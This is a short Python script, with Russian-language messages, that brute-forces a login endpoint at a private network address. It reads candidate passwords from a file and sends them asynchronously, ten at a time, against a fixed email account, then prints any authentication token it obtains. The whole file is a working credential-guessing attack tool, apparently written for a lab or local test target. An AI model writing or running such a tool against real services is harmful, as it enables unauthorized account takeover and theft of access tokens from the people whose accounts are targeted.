import aiohttp
import asyncio
import aiofiles

from pass_stil import give_pass

import time

url = "http://192.168.0.185:8000/token/"
email = "urf5g8vo@gmail.com"
logs = 'log_post.txt'


with open("all_pass.txt", 'r') as file:
    if file.read().strip() == "":
        give_pass(logs)
    else:
        print("Пароли найдены!")
    

async def send_pass(session, email, password, sem):
    async with sem:
        start_time = time.perf_counter()
        async with session.post(url, data={"username": email, "password": password}) as resp:
            end_time = time.perf_counter() - start_time
            if resp.status == 200:
                result = await resp.json()
                print(f"[+] Пароль найден: {password}, токен: {result}. Время={end_time:.4f}s")
                return True
            else:
                print(f"[+] Пароль: {password} не подошел! Время={end_time:.4f}s")
            return False

async def hack(session, email):
    sem = asyncio.Semaphore(10)
    task = []
    i = 1

    async with aiofiles.open('all_pass.txt', 'r', encoding='utf-8') as file:
        async for line in file:
            password = line.strip()
    
            task.append(asyncio.create_task(send_pass(session, email, password, sem)))
            #print(f"{[i]} Задача создана для пароля: {password}")
            i += 1

    found = False

    for i in asyncio.as_completed(task):
        result = await i
        if result:
            print("Успех, пароль найден")
            found = True
            for t in task:
                if not t.done():
                    t.cancel()
        
    if not found:
        print("Ничего не подошло")

async def main():
    async with aiohttp.ClientSession() as session:
        await hack(session, email)

if __name__ == "__main__":
    asyncio.run(main())